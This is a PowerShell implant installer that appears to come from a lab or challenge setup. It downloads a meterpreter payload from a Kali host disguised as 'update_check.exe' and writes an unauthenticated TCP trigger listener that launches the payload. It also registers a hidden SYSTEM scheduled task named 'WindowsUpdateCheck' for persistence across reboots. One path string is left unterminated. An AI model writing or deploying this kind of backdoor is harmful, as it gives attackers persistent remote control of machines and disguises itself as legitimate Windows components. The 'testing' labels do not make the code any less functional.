# === Implant Setup Script ===
# Drops challenge wrapper, meterpreter payload, creates scheduled task, and starts immediately

$kaliIP = "172.30.119.180"
$baseURL = "http://${kaliIP}:8080"
$basePath = "C:\Windows\
$challengePort = 4444
$meterPort = 5555
$payloadPath = "$basePath\update_check.exe"
$wrapperPath = "$basePath\challenge_wrapper.ps1"

# Step 1: Create directory
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Write-Host "[*] Directory created." -ForegroundColor Green

# Step 2: Download meterpreter payload
Invoke-WebRequest -Uri "$baseURL/update_check.exe" -OutFile $payloadPath
if (Test-Path $payloadPath) {
    Write-Host "[*] Payload downloaded successfully." -ForegroundColor Green
} else {
    Write-Host "[!] Payload download failed - is your HTTP server running?" -ForegroundColor Red
    exit
}

# Step 3: Write the challenge wrapper (no auth for testing)
$wrapper = @"
`$port = $challengePort
`$meterpreterPath = "$payloadPath"

`$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, `$port)
`$listener.Start()

while (`$true) {
    try {
        `$client = `$listener.AcceptTcpClient()
        `$stream = `$client.GetStream()
        `$writer = New-Object System.IO.StreamWriter(`$stream)
        `$writer.AutoFlush = `$true

        # No auth - just spawn meterpreter on any connection
        `$writer.WriteLine("OK")

        # Check if meterpreter is already running to avoid duplicate processes
        `$running = Get-Process | Where-Object { `$_.Path -eq `$meterpreterPath }
        if (-not `$running) {
            Start-Process -FilePath `$meterpreterPath
            `$writer.WriteLine("Meterpreter launched.")
        } else {
            `$writer.WriteLine("Meterpreter already running.")
        }

        `$client.Close()
    } catch {
        # Silently continue on errors to keep wrapper alive
    }
}
"@

$wrapper | Out-File -FilePath $wrapperPath -Encoding ASCII
if (Test-Path $wrapperPath) {
    Write-Host "[*] Challenge wrapper written successfully (auth disabled)." -ForegroundColor Yellow
} else {
    Write-Host "[!] Failed to write challenge wrapper." -ForegroundColor Red
    exit
}

# Step 4: Create scheduled task for reboot persistence
schtasks /create /tn "WindowsUpdateCheck" `
    /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $wrapperPath" `
    /sc onstart `
    /ru SYSTEM `
    /f

$task = schtasks /query /tn "WindowsUpdateCheck"
if ($task) {
    Write-Host "[*] Scheduled task created successfully." -ForegroundColor Green
} else {
    Write-Host "[!] Scheduled task creation failed." -ForegroundColor Red
    exit
}

# Step 5: Start wrapper immediately - no reboot needed
Start-Process powershell.exe `
    -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File $wrapperPath" `
    -WindowStyle Hidden

Write-Host "[*] Wrapper started immediately." -ForegroundColor Green

# Step 6: Summary
Write-Host ""
Write-Host "===== IMPLANT INSTALLED =====" -ForegroundColor Cyan
Write-Host "  Wrapper:   $wrapperPath" -ForegroundColor Cyan
Write-Host "  Payload:   $payloadPath" -ForegroundColor Cyan
Write-Host "  Task:      WindowsUpdateCheck (SYSTEM, runs on boot)" -ForegroundColor Cyan
Write-Host "  Port:      $challengePort (trigger), $meterPort (meterpreter)" -ForegroundColor Cyan
Write-Host "  Auth:      DISABLED (testing mode)" -ForegroundColor Yellow
Write-Host ""
Write-Host "===== NEXT STEPS =====" -ForegroundColor Yellow
Write-Host "  1. On Kali: ./test_connect.sh to trigger meterpreter" -ForegroundColor Yellow
Write-Host "  2. On Kali: run multi/handler on port $meterPort to catch session" -ForegroundColor Yellow
Write-Host "=============================" -ForegroundColor Cyan